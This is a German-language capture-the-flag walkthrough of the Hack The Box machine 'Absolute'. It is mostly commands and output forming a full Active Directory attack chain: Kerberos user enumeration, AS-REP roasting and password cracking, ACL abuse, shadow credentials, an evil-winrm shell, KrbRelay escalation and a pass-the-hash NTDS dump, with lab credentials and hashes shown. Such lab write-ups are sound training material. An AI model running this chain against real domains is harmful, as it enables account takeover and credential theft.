---
title: Writeup_Absolute
date: 2023-06-30 11:45:00 +0100
categories: [HTB, Maschine]
tags: [ffuf, dirsearch, kerbrute, bloodhount, impacket, ntpdate, gettgtpkinit, pywhisker, neo4j]
comments: false
---

Fangen wir mit einem normalen nmap Scan an

```
┌──(bumble㉿kali)-[~]
└─$ nmap -sC -sV 10.129.75.247 --min-rate 5000 -Pn 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-26 08:12 CEST
Nmap scan report for absolute.htb (10.129.75.247)
Host is up (0.056s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Absolute
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-26 13:12:05Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-09-26T13:12:55+00:00; +6h59m53s from scanner time.
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2022-06-09T08:14:24
|_Not valid after:  2023-06-09T08:14:24
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-09-26T13:12:55+00:00; +6h59m53s from scanner time.
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2022-06-09T08:14:24
|_Not valid after:  2023-06-09T08:14:24
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2022-06-09T08:14:24
|_Not valid after:  2023-06-09T08:14:24
|_ssl-date: 2022-09-26T13:12:55+00:00; +6h59m53s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2022-06-09T08:14:24
|_Not valid after:  2023-06-09T08:14:24
|_ssl-date: 2022-09-26T13:12:55+00:00; +6h59m53s from scanner time.
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m52s, deviation: 0s, median: 6h59m52s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-09-26T13:12:47
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.84 seconds
zsh: segmentation fault  nmap -sC -sV 10.129.75.247 --min-rate 5000 -Pn
                                                                                                         
```

Ich finde keine Subdomains

```
┌──(bumble㉿kali)-[~]
└─$ ffuf -u 'http://absolute.htb' -w /mnt/backup/Seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.absolute.htb" -fw 633

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://absolute.htb
 :: Wordlist         : FUZZ: /mnt/backup/Seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.absolute.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 633
________________________________________________

:: Progress: [114441/114441] :: Job [1/1] :: 810 req/sec :: Duration: [0:02:22] :: Errors: 0 ::

```

Dirseach liefert auch kein Ergebnis ab

```
┌──(bumble㉿kali)-[~]
└─$ dirsearch -u http://absolute.htb 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/bumble/.dirsearch/reports/absolute.htb/_22-09-26_08-20-21.txt

Error Log: /home/bumble/.dirsearch/logs/errors-22-09-26_08-20-21.log

Target: http://absolute.htb/

[08:20:21] Starting: 
[08:20:22] 403 -  312B  - /%2e%2e//google.com                              
[08:20:22] 301 -  146B  - /js  ->  http://absolute.htb/js/                 
[08:20:31] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[08:20:47] 301 -  147B  - /css  ->  http://absolute.htb/css/                
[08:20:52] 301 -  149B  - /fonts  ->  http://absolute.htb/fonts/            
[08:20:55] 301 -  150B  - /images  ->  http://absolute.htb/images/          
[08:20:55] 403 -    1KB - /images/                                          
[08:20:55] 200 -    3KB - /index.html                                       
[08:20:57] 403 -    1KB - /js/                                              
                                                                             
Task Completed

```

Versuchen wir enum4linux

```
┌──(bumble㉿kali)-[/mnt/backup/Windows-Tools]
└─$ enum4linux -n absolute.htb                                                
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Sep 26 09:04:12 2022

 =========================================( Target Information )=========================================
Target ........... absolute.htb                                                                                                                                                                                                             
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 ============================( Enumerating Workgroup/Domain on absolute.htb )============================
[E] Can't find workgroup/domain                                                                                                                                                                                                             
================================( Nbtstat Information for absolute.htb )================================
Looking up status of 10.129.75.247                                                                                                                                                                                                          
No reply from 10.129.75.247
===================================( Session Check on absolute.htb )===================================
[+] Server absolute.htb allows sessions using username '', password ''                                                                                                                                                                      
================================( Getting domain SID for absolute.htb )================================
Domain Name: absolute                                                                                                                                                                                                                       
Domain Sid: S-1-5-21-4078382237-1492182817-2568127209

[+] Host is part of a domain (not a workgroup)                                                                                                                                                                                              
enum4linux complete on Mon Sep 26 09:04:33 2022                                                                                                                                                                                             

```

Da wir hier erstmal nichts finden, fangen wir ganz einfach beim ersten Port an, Port 53 lasse ich bewusst erstmal weg

```
┌──(bumble㉿kali)-[/mnt/backup/Windows-Tools]
└─$ ./kerbrute userenum /mnt/backup/Seclists/Usernames/Names/names.txt -d absolute.htb --dc dc.absoulte.htb

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/26/22 - Ronnie Flathers @ropnop

2022/09/26 09:00:14 >  Using KDC(s):
2022/09/26 09:00:14 >   dc.absoulte.htb:88

2022/09/26 09:01:42 >  Done! Tested 10177 usernames (0 valid) in 87.126 seconds

```

Da ich bisher keinen Erfolg hatte an irgendwelche Username zu kommen habe ich die bilder runterlgeladen

```
┌──(bumble㉿kali)-[/mnt/backup/HTB_Machines/absolute]
└─$ wget http://absolute.htb/images/hero_1.jpg                                        
--2022-09-26 13:26:16--  http://absolute.htb/images/hero_1.jpg
Auflösen des Hostnamens absolute.htb (absolute.htb)… 10.129.75.247
Verbindungsaufbau zu absolute.htb (absolute.htb)|10.129.75.247|:80 … verbunden.
HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
Länge: 407495 (398K) [image/jpeg]
Wird in »hero_1.jpg« gespeichert.

hero_1.jpg                                                 100%[========================================================================================================================================>] 397,94K   520KB/s    in 0,8s    

2022-09-26 13:26:17 (520 KB/s) - »hero_1.jpg« gespeichert [407495/407495]

                                                                                                                                                                                                                                            
┌──(bumble㉿kali)-[/mnt/backup/HTB_Machines/absolute]
└─$ exiftool hero_1.jpg                                        
ExifTool Version Number         : 12.44
File Name                       : hero_1.jpg
Directory                       : .
File Size                       : 407 kB
File Modification Date/Time     : 2022:06:07 21:45:20+02:00
File Access Date/Time           : 2022:09:26 13:26:17+02:00
File Inode Change Date/Time     : 2022:06:07 21:45:20+02:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian (Intel, II)
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Artist                          : James Roberts
Y Cb Cr Positioning             : Centered
Quality                         : 60%
XMP Toolkit                     : Image::ExifTool 11.88
Author                          : James Roberts
Creator Tool                    : Adobe Photoshop CC 2018 Macintosh
Derived From Document ID        : 6413FD608B5C21D0939F910C0EFBBE44
Derived From Instance ID        : 6413FD608B5C21D0939F910C0EFBBE44
Document ID                     : xmp.did:887A47FA048811EA8574B646AF4FC464
Instance ID                     : xmp.iid:887A47F9048811EA8574B646AF4FC464
DCT Encode Version              : 100
APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 1900
Image Height                    : 1150
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 1900x1150
Megapixels                      : 2.2

```

Nun noch aus allen Bildern die Authoren heraussuchen

```
┌──(bumble㉿kali)-[/mnt/backup/HTB_Machines/absolute]
└─$ cat authors.txt         
James Roberts
Michael Chaffrey
Donald Klay
Sarah Osvald
Jeffer Robinson
Nicole Smith                                                                                                                                                                                                                                            

```


sieht schon mal gut aus.

```
┌──(bumble㉿kali)-[/mnt/backup/Windows-Tools]
└─$ ./kerbrute userenum /mnt/backup/HTB_Machines/absolute/users.txt -d absolute.htb --dc 10.129.75.247 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/26/22 - Ronnie Flathers @ropnop

2022/09/26 13:52:47 >  Using KDC(s):
2022/09/26 13:52:47 >   10.129.75.247:88

2022/09/26 13:52:47 >  [+] VALID USERNAME:       j.roberts@absolute.htb
2022/09/26 13:52:47 >  [+] VALID USERNAME:       j.robinson@absolute.htb
2022/09/26 13:52:47 >  [+] VALID USERNAME:       m.chaffrey@absolute.htb
2022/09/26 13:52:47 >  [+] VALID USERNAME:       s.osvald@absolute.htb
2022/09/26 13:52:47 >  [+] VALID USERNAME:       n.smith@absolute.htb
2022/09/26 13:52:47 >  [+] VALID USERNAME:       d.klay@absolute.htb
2022/09/26 13:52:47 >  Done! Tested 6 usernames (6 valid) in 0.170 seconds
                                                                                    
```

da wir kerberos machen können wir auch impacket verwenden


```
┌──(bumble㉿kali)-[/mnt/backup/impacket/examples]
└─$ python3 GetNPUsers.py absolute.htb/ -dc-ip 10.129.75.247 -usersfile /mnt/backup/HTB_Machines/absolute/users.txt 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User j.roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User m.chaffrey doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$d.klay@ABSOLUTE.HTB:79741e44e5197ffd703b5fc581e5fb13$cc74d0e5586afb23fa8d841b8fe39faf2f1841ab9a96d031baca421a5aad230d9f81e1a130614eabe16ae5e8a7ba418cf371919100b830b2ac0492c17cb807fecbf98f587b36bfd76087aca3534320cb4b958437dd46fc7ff287574c2733e8c41efa7fa3c7c97401dba409dfb4b7f5d805821455e7a694514bb41445fdeab4b2b1485672121b7591aab2f8a5197beb9d6dc228205f8d241017b3789b4e1a7216f73f6272fb3582c7b90884558846b5b268bfa752bc1ec82aafefe218f546422576108708c6d45bf81bc2c2e7b3591b2ceeca9526004951c7e89a522adac44b740d6c637619ac459c56c28394
[-] User s.osvald doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.robinson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User n.smith doesn't have UF_DONT_REQUIRE_PREAUTH set

```


versuchen wir das zu cracken

```
┌──(bumble㉿kali)-[/mnt/backup/impacket/examples]
└─$ john --wordlist=/mnt/backup/rockyou.txt /mnt/backup/HTB_Machines/absolute/chaffery_hash 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Darkmoonsky248girl ($krb5asrep$23$d.klay@ABSOLUTE.HTB)     
1g 0:00:00:17 DONE (2022-09-26 14:47) 0.05659g/s 636015p/s 636015c/s 636015C/s Darren@msn..Danuel0830
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Nachdem wir nun einen User "d.klay" und sein passwort haben versuchen wir bloodhount

```
┌──(bumble㉿kali)-[/mnt/backup/BloodHound.py-Kerberos]
└─$ python3 bloodhound.py -u 'd.klay' -p 'Darkmoonsky248girl' -ns 10.129.214.2 -d absolute.htb -c All -dc dc.absolute.htb                     
INFO: Found AD domain: absolute.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Found 18 users
INFO: Found 55 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.absolute.htb
INFO: Ignoring host dc.absolute.htb since its reported name  does not match
INFO: Done in 00M 05S
```

Ich finde weitere neue User.


![Bild1](/assets/Bilder/Maschine_Absolute/Pasted%20image%2020220927153508.png){: width="700" height="400" }

Beim Durchklicken der User ist mir folgender Eintrag aufgefallen.
In der Beschreibung finde ich ein Potenzielles password


![Bild2](/assets/Bilder/Maschine_Absolute/Pasted%20image%2020220927153610.png){: width="700" height="400" }
svc_smb:AbsoluteSMBService123!


Versuchen wir uns ein Ticket zu erstellen

```
┌──(bumble㉿kali)-[/mnt/backup/impacket/examples]
└─$ python3 getTGT.py -dc-ip dc.absolute.htb absolute.htb/svc_smb:AbsoluteSMBService123!                        
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in svc_smb.ccache

```

Versuchen wir unser Glück

```
┌──(bumble㉿kali)-[/mnt/backup/HTB_Machines/absolute]
└─$ impacket-smbclient absolute.htb/svc_smb@dc.absolute.htb -k -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

```

Ich erhalte eine Fehlermeldung, versuchen wir die Zeit zu synchronisieren

```
┌──(bumble㉿kali)-[/mnt/backup/HTB_Machines/absolute]
└─$ sudo timedatectl set-ntp false                                                                   
                    
┌──(bumble㉿kali)-[/mnt/backup/HTB_Machines/absolute]
└─$ sudo ntpdate -s absolute.htb          

──(bumble㉿kali)-[/mnt/backup/HTB_Machines/absolute]
└─$ impacket-smbclient absolute.htb/svc_smb@dc.absolute.htb -k -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

# shares
ADMIN$
C$
IPC$
NETLOGON
Shared
SYSVOL
# use shared
# ls
drw-rw-rw-          0  Thu Sep  1 19:02:23 2022 .
drw-rw-rw-          0  Thu Sep  1 19:02:23 2022 ..
-rw-rw-rw-         72  Thu Sep  1 19:02:23 2022 compiler.sh
-rw-rw-rw-      67584  Thu Sep  1 19:02:23 2022 test.exe
# get compiler.sh
# get test.exe
# exit
+                                                                                                                                                                                                                                           
```

Schauen wir uns mal die 2 Dateien an.

```
┌──(bumble㉿kali)-[/mnt/backup/HTB_Machines/absolute]
└─$ cat compiler.sh         
#!/bin/bash

nim c -d:mingw --app:gui --cc:gcc -d:danger -d:strip $1
```

und nun die exe Datei

```
┌──(bumble㉿kali)-[/mnt/backup/HTB_Machines/absolute]
└─$ file test.exe                                                                                                                             
test.exe: PE32+ executable (GUI) x86-64 (stripped to external PDB), for MS Windows

```

Ich habe mir die exe Datei auf meine Commando VM gezogen und dort meine VPN gestartet.


![Bild4](/assets/Bilder/Maschine_Absolute/Pasted%20image%2020220930103158.png){: width="700" height="400" }

Nun noch die Hosts Datei in Windows angepasst

```
C:\Windows\System32\drivers\etc
```


![Bild5](/assets/Bilder/Maschine_Absolute/Pasted%20image%2020220930103305.png){: width="700" height="400" }

Nachdem ich dort erstmal nichts gesehen habe, habe ich Wireshark gestartet.


![Bild6](/assets/Bilder/Maschine_Absolute/Pasted%20image%2020220930103337.png){: width="700" height="400" }
Ich sehe eine Anmeldung 


![Bild7](/assets/Bilder/Maschine_Absolute/Pasted%20image%2020220930103400.png){: width="700" height="400" }
```
absolute.htb\mlovegod

AbsoluteLDAP2022!
```


Schauen wir mal in bloodhound nach


![Bild8](/assets/Bilder/Maschine_Absolute/Pasted%20image%2020220930162357.png){: width="700" height="400" }


```
PS C:\Users\bumble\Downloads > Import-Module .\powerview.ps1
COMMANDO 01.10.2022 21:01:05
PS C:\Users\bumble\Downloads > $SecPassword = ConvertTo-SecureString 'AbsoluteLDAP2022!' -AsPlainText -Force
COMMANDO 01.10.2022 21:01:18
PS C:\Users\bumble\Downloads > $Cred = New-Object System.Management.Automation.PSCredential('ABSOLUTE.HTB\m.lovegod', $SecPassword)
COMMANDO 01.10.2022 21:01:27
PS C:\Users\bumble\Downloads >  Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'Network Audit' -PrincipalIdentity "m.lovegod" -Rights All -DomainController dc.absolute.htb
COMMANDO 01.10.2022 21:01:46
PS C:\Users\bumble\Downloads > Add-ADPrincipalGroupMembership -Identity  m.lovegod -MemberOf  'Network Audit' -Credential $Cred -Server dc.absolute.htb
COMMANDO 01.10.2022 21:02:15
PS C:\Users\bumble\Downloads > Get-DomainGroupMember -Identity 'network audit' -Domain ABSOLUTE.HTB -DomainController dc.absolute.htb -Credential $cred


GroupDomain             : ABSOLUTE.HTB
GroupName               : Network Audit
GroupDistinguishedName  : CN=Network Audit,CN=Users,DC=absolute,DC=htb
MemberDomain            : absolute.htb
MemberName              : svc_audit
MemberDistinguishedName : CN=svc_audit,CN=Users,DC=absolute,DC=htb
MemberObjectClass       : user
MemberSID               : S-1-5-21-4078382237-1492182817-2568127209-1115

GroupDomain             : ABSOLUTE.HTB
GroupName               : Network Audit
GroupDistinguishedName  : CN=Network Audit,CN=Users,DC=absolute,DC=htb
MemberDomain            : absolute.htb
MemberName              : m.lovegod
MemberDistinguishedName : CN=m.lovegod,CN=Users,DC=absolute,DC=htb
MemberObjectClass       : user
MemberSID               : S-1-5-21-4078382237-1492182817-2568127209-1109



COMMANDO 01.10.2022 21:02:45
```


Nun ein neues Ticket erhalten

```
┌──(bumble㉿kali)-[/mnt/backup/HTB_Machines/absolute/pywhisker]
└─$ python3 /mnt/backup/impacket/examples/getTGT.py -dc-ip dc.absolute.htb absolute.htb/m.lovegod:AbsoluteLDAP2022!
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in m.lovegod.ccache
```



```
┌──(bumble㉿kali)-[/mnt/backup/HTB_Machines/absolute/pywhisker]
└─$ export KRB5CCNAME=m.lovegod.ccache                                                                             
                                                                                                                                                                                                                                            
┌──(bumble㉿kali)-[/mnt/backup/HTB_Machines/absolute/pywhisker]
└─$ python3 pywhisker.py -d absolute.htb -u "m.lovegod" -k --no-pass -t "winrm_user" --action "add"                
[*] Searching for the target account
[*] Target user found: CN=winrm_user,CN=Users,DC=absolute,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 4a2beaa9-b58d-4e3a-6d84-e66580a9b510
[*] Updating the msDS-KeyCredentialLink attribute of winrm_user
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: 2TSoyPbU.pfx
[*] Must be used with password: 0XYhYMy2wzHVbHJb7Lgl
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

Schauen wir mal was wir erhalten

```
┌──(bumble㉿kali)-[/mnt/backup/HTB_Machines/absolute/pywhisker]
└─$ ls                                                                              
2TSoyPbU.pfx  LICENSE  m.lovegod.ccache  pywhisker.py  README.md  requirements.txt

```

Versuchen wir das zu cracken

```
┌──(bumble㉿kali)-[/mnt/backup/HTB_Machines/absolute/pywhisker]
└─$ python3 gettgtpkinit.py absolute.htb/winrm_user -cert-pfx 2TSoyPbU.pfx -pfx-pass 0XYhYMy2wzHVbHJb7Lgl winrm_user_ccache
2022-09-30 22:49:44,292 minikerberos INFO     Loading certificate and key from file
2022-09-30 22:49:44,335 minikerberos INFO     Requesting TGT
2022-09-30 22:50:08,614 minikerberos INFO     AS-REP encryption key (you might need this later):
2022-09-30 22:50:08,614 minikerberos INFO     2819122c78600612573bb986974074f7fa05f9a6c577568f7232a12143b3b056
2022-09-30 22:50:08,622 minikerberos INFO     Saved TGT to file

```

jetzt müssen wir noch die krb5.conf anpassen

```
┌──(bumble㉿kali)-[/mnt/backup/HTB_Machines/absolute/pywhisker]
└─$ sudo nano /etc/krb5.conf    
[sudo] Passwort für bumble:

[libdefaults]
        #default_realm = SCRM.LOCAL
        default_realm = ABSOLUTE.HTB
            ABSOLUTE.HTB = {
                kdc = DC.ABSOLUTE.HTB
                admin_server = ABSOLUTE.HTB
        }

```


Nun starten wir einen Verbindungsaufbau

```
┌──(bumble㉿kali)-[/mnt/backup/HTB_Machines/absolute/pywhisker]
└─$ export KRB5CCNAME=winrm_user_ccache          

```

Evil-Winrm

```
┌──(bumble㉿kali)-[/mnt/backup/HTB_Machines/absolute/pywhisker]
└─$ evil-winrm -i DC.ABSOLUTE.HTB -r ABSOLUTE.HTB

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\winrm_user\Documents> cd ..
*Evil-WinRM* PS C:\Users\winrm_user> cd Desktop
*Evil-WinRM* PS C:\Users\winrm_user\Desktop> dir


    Directory: C:\Users\winrm_user\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/30/2022   8:25 AM             34 user.txt


*Evil-WinRM* PS C:\Users\winrm_user\Desktop> type user.txt
25ddcb08becfef167f0bdf669975f4b8

```

Laden wir mal winpeas hoch

```
*Evil-WinRM* PS C:\Users\winrm_user\Desktop> upload /mnt/backup/Windows-Tools/winPEASany.exe
Info: Uploading /mnt/backup/Windows-Tools/winPEASany.exe to C:\Users\winrm_user\Desktop\winPEASany.exe

                                                             
Data: 2621440 bytes of 2621440 bytes copied

Info: Upload successful!

```

Ich finde folgenden interessanten Eintrag

```
ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking KrbRelayUp
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#krbrelayup
  The system is inside a domain (absolute) so it could be vulnerable.
È You can try https://github.com/Dec0ne/KrbRelayUp to escalate privileges

```

https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html

Versuchen wir unser Glück

```
PS C:\Users\winrm_user\Documents> ./runascs.exe m.lovegod 'AbsoluteLDAP2022!' -d absolute.htb -l 9 "C:\users\winrm_user\documents\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid {752073A1-23F2-4396-85F0-8FDB879ED0ED} -shadowcred"
```

![Bild10](/assets/Bilder/Maschine_Absolute/Pasted%20image%2020221007083255.png){: width="700" height="400" }

Wir bekommen einen NTLM hash versuchen wir einen anderen weg

```
┌──(bumble㉿kali)-[/mnt/backup/HTB_Machines/absolute]
└─$ cme smb dc.absolute.htb -u 'DC$' -H A7864AB463177ACB9AEC553F18F42577 --ntds
/home/bumble/.local/pipx/venvs/crackmapexec/lib/python3.10/site-packages/paramiko/transport.py:236: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
SMB         absolute.htb    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         absolute.htb    445    DC               [+] absolute.htb\DC$:A7864AB463177ACB9AEC553F18F42577 
SMB         absolute.htb    445    DC               [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
SMB         absolute.htb    445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         absolute.htb    445    DC               Administrator\Administrator:500:aad3b435b51404eeaad3b435b51404ee:1f4a6093623653f6488d5aa24c75f2ea:::
```


![Bild11](/assets/Bilder/Maschine_Absolute/Pasted%20image%2020221005170805.png){: width="700" height="400" }